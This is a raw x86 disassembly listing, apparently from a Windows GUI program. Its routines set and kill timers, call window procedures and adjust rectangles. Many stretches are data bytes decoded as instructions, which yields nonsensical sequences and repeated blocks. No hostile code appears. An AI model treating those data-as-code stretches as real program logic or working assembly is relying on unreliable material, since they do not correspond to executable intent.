mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424c60
pop ebx
mov esp ebp
pop ebp
retn
inc ebp
in al 0x8b
inc ebp
clc
inc esp
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
fmul [ ebx + 0x4589f445 ]
fmul [ ebx - 0x1fba76fd ]
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov al [ 0x4453 ]
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x55 ] bp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
sub_42d2af
loopne r-xdata
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42d31472
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
aam 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
rol [ edx ] cl
or al 0xd4
inc edx
add [ edx + eax ] ah
add [ eax ] al
sbb al 0x63
inc esp
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah bh
and eax [ ebp ]
[ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x42 ] dl
add [ ecx - 0x1957ffbb ] al
inc edx
add ah dl
out 0x42 al
add [ ebx + eax + 0x69c0045 ] ch
inc ebp
add [ eax ] al
jecxz r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
or al 0x54
inc ebx
jne r-xdata
add [ edi ] al
add [ ebx ] bh
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
[ ecx + 0x42 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
je r-xdata
add ah dl
out 0x42 al
add [ ebx + eax + 0x69c0045 ] ch
inc ebp
add [ eax ] al
jecxz r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
insd
push eax
popad
outsb
insb
adc al 0xd3
inc edx
add [ esp + 0x44 ] cl
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
or eax [ eax ]
add eax 0x67696c41
outsb
dec eax
push ebp
inc ecx
add [ eax ] ah
add al [ eax ]
add [ esi ] al
push esp
push eax
popad
outsb
insb
nop
inc edx
cmp al 0x14
inc ebx
je r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
push esp
dec esi
inc esp
add [ ecx ] ah
add bh bh
je r-xdata
je r-xdata
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x42 ] dl
add [ ecx - 0x1957ffbb ] al
inc edx
adc al 0x42
insb
jae r-xdata
push 0x70042d5
push es
push esp
push eax
popad
outsb
insb
nop
aam 0x42
add [ esp + edx * 8 ] bl
inc edx
add [ edx ] al
or [ ebp + 0x78 ] al
je r-xdata
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x42d5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 + 0x42 ] bl
add [ eax ] ch
add al [ eax ]
add al cl
rol [ edx ] cl
cmp al 0x17
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
add bh bh
shl ah 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
mov esp 0x5f004155
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
mov ah ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ edi + eax * 2 ] ch
inc esp
add [ ebx ] bl
add bh bh
xor al 0x93
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah bh
and eax [ ebp ]
[ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xcc65646f
pop esp
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
inc esp
add [ eax ] bl
add al [ eax ]
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x5ccc6564
insb
dec ecx
outsb
outsb
jb r-xdata
inc ebx
jb r-xdata
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc esp
add [ edx ] dl
add al [ eax ]
jmp [ esp + 0x10042 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
or [ ebp ] al
or [ eax ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
cld
dec ebp
inc esp
add [ eax ] ah
sahf
inc esp
add [ eax - 0x62 ] dl
inc esp
add [ esi + edi * 4 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi - 0x4f00ffff ] ah
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add al bl
sbb [ ebp ] al
mov esp 0x1ffe0000
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100023 ] al
popad
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
add bh bh
rcr [ edi - 0x6023ffbc ] 0x44
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
add [ 0x6f6c6f43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x14ff0000
lahf
inc esp
add [ edi + ebx * 4 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
popad
outsb
popad
jb r-xdata
dec ebp
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
adc al 0x47
adc [ eax ] al
test al 0x1
add bh bh
clc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
insb
outsd
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
fcomp [ eax ]
inc ebp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
mov eax 0x38004508
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
xor [ eax ] 0x0
jpe r-xdata
popad
outsb
push edx
jae r-xdata
jb r-xdata
inc eax
popfd
jo r-xdata
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
in al 0x9f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941db66
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
add al 0x57
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
dec esp
lahf
inc esp
add [ ecx ] al
or [ ebp ] al
cmp [ ecx ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
and eax 0x61500b00
jb r-xdata
adc [ eax ] al
test eax 0x8cff0001
or [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
movsb [ edi ] [ esi ]
push ecx
inc esp
add al ch
push eax
outsd
jo r-xdata
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe4656c62
push esp
inc esp
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x63 ]
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov es [ ebp ]
jl r-xdata
inc edi
je r-xdata
add al 0x57
inc ecx
add al al
push edi
jo r-xdata
add [ eax ] al
jo r-xdata
jo r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
dec ebp
inc esp
add [ eax + 0x38004508 ] bh
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
mov eax 0xe000444f
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xb86f666e
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
inc esp
jb r-xdata
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
push esp
push ebp
inc esp
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13002f ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
push edx
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc esp
add [ eax ] bh
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
push esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
push edi
inc ecx
add al cl
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
jo r-xdata
clc
jb r-xdata
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
or ecx [ edi + 0x6e ]
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
push ebx
inc esp
add [ eax - 0x4700ffff ] bh
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424514
inc esp
outsd
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
push esp
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
[ eax ]
push edi
inc ecx
add [ eax ] ch
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
jb r-xdata
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424c60
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424514
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424c60
pop ebx
mov esp ebp
pop ebp
retn
inc ebp
in al 0x8b
inc ebp
clc
inc esp
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
fmul [ ebx + 0x4589f445 ]
fmul [ ebx - 0x1fba76fd ]
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov al [ 0x4453 ]
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x55 ] bp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
sub_42dd5c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424514
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424c60
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424514
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424c60
pop ebx
mov esp ebp
pop ebp
retn
sub_42de20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424620
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_42dd5c
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42de80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42df08
call sub_422118
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42ded0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42df7c
mov eax [ esi + 0x34 ]
call sub_4221cc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421018
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_42df08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42df42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42df7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42dffb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e002
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_42e054
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4523a0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov edx 0xb9
mov eax esi
call sub_4495dc
mov edx 0x29
mov eax esi
call sub_449600
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42e4a4
mov edx 0x1
mov eax esi
call sub_42e4c0
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_449fc0
mov [ esi + 0x21d ] 0x1
